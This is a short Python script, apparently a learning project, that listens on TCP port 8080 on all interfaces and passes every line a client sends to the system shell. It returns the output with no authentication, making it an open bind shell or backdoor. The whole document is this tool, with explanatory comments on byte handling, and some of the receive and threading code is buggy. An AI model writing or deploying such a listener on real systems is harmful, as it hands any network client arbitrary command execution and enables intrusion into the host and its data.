#!/usr/bin/python3
import subprocess as sp
import socket
import threading as tr

# already synchronized (python3+)
from queue import Queue

NTHREADS = 64

PORT = 8080
HOSTNAME = ""
BACKLOGSIZE = 5

MAXINPUTSIZE = 1024

tr_pool = [None]*NTHREADS
conn_q = None

def send_msg(s, msg):
    acc = 0
    sent = 0
    while sent := s.send(msg[acc:]):
        acc += sent

def recv_line(s):
    line = b""
    acc = 0

    while line == b"":
        recvd = s.recv(MAXINPUTSIZE)
        for i in range(len(recvd)):
            # recvd is a bytes object
            # indexing a bytes object returns an int
            # so recvd[idx] == b'\n' is always False since
            # int != bytes in python3 (ascii '\n' == 0x0a)
            # for encoding independency: int.from_bytes()
            if recvd[acc+i] == int.from_bytes(b'\n', "little"):
                line = recvd[:acc+i]
        acc += len(recvd)

    return line

#p = {
#        returncode : int
#        stdout : bytes
#        args : str
#    }
# python3 "stderr=sp.STDOUT" == bash "2>&1"
# sp.PIPE (docs): "Special value that can be used as the stdin, stdout
# or stderr argument to Popen and indicates that a pipe to the
# standard stream should be opened."
def shell_loop(s):
    while cmd := recv_line(s):
        p = sp.run(cmd, shell=True, stdout=sp.PIPE, stderr=sp.STDOUT)
        msg = bytearray()
        if p.returncode != 0:
            msg += bytes("ERROR. RETCODE %d" % p.returncode, "utf8")
        else:
            msg += bytes("OK. RETCODE: %d" % p.returncode, "utf8")
        msg += b"\n\n" + p.stdout
        send_msg(s, msg)

        if (cmd == b"exit"):
            break
    s.close()

def pool_loop():
    global conn_q

    s, addr = conn_q.get()
    shell_loop(s)


def start_tr_pool():
    for i in range(NTHREADS):
        tr_pool.append(tr.Thread(target=pool_loop, args=()))
        tr_pool[-1].start()

def set_tcp_sv():
    sv_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sv_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR | socket.SO_REUSEPORT, 1)
    sv_s.bind((HOSTNAME, PORT))
    sv_s.listen(BACKLOGSIZE)
    return sv_s

def main():
    global conn_q

    sv_s = set_tcp_sv()
    conn_q = Queue()
    start_tr_pool()
    while True:
        conn = sv_s.accept()
        conn_q.put(conn)


if __name__ == "__main__":
    main()
